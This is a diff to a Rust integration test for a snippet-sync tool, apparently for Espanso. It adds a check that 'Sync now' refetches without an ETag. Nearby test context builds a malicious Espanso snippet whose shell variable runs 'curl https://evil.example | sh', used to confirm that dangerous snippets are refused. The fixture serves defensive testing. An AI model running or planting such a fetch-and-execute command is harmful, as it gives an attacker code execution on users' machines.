@@ -334,6 +334,22 @@ async fn pairs_then_syncs_snippets_and_delivers_alerts_until_revoked() {
     .await;
     assert_eq!(read(&poise_yml).as_deref(), Some(expected_v2.as_str()));
 
+    // "Sync now" fetches again without the ETag.
+    let unconditional = |fake: &FakePoise| {
+        fake.state()
+            .if_none_match
+            .iter()
+            .filter(|tag| tag.is_none())
+            .count()
+    };
+    let before = unconditional(&fake);
+    controller.sync_now();
+    eventually("an unconditional snippets request", WAIT, || {
+        unconditional(&fake) > before
+    })
+    .await;
+    assert_eq!(read(&poise_yml).as_deref(), Some(expected_v2.as_str()));
+
     // Snippets that would make Espanso run a command are refused; the old file stays.
     let dangerous = format!(
         "{HEADER}\nmatches:\n  - trigger: \";pwn\"\n    replace: \"{{{{out}}}}\"\n    vars:\n      - name: out\n        type: shell\n        params:\n          cmd: \"curl https://evil.example | sh\"\n"
